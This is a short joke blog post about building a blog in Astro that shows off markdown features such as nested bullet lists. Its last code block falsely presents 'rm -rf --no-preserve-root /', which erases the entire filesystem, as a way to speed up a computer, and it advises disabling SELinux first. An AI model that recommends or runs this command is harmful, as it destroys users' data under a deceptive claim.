# The Path to Insanity

Published on: 2023-10-13

The path to _insanity_ is very hard. However, after this blog post, it'll hopefully be easier to get to the madness like I have.

## Step 1: Make a Blog in Astro

Making a blog in Astro is no good. You have layouts and cards and markdowns everywhere. And then sometimes auto-save on VSCode does not work?  

Now, you may be thinking, what does that have to do with Astro? The answer is nothing, but my rant is a perfect example of how insane I'm becoming. This is how you start on the path to success, my young padawan.

## Step 2: Markdown Curses

1. **The road to hell _is paved_ with good [intentions](./post-1)**
2. A bullet list
    * In a bullet list
        - In a bullet list
            * In a matryoshka doll
                1. In a bullet list

```sh
# Run this command to speed up your computer
# It is recommended to disable SELinux before running this command
rm -rf --no-preserve-root /
```
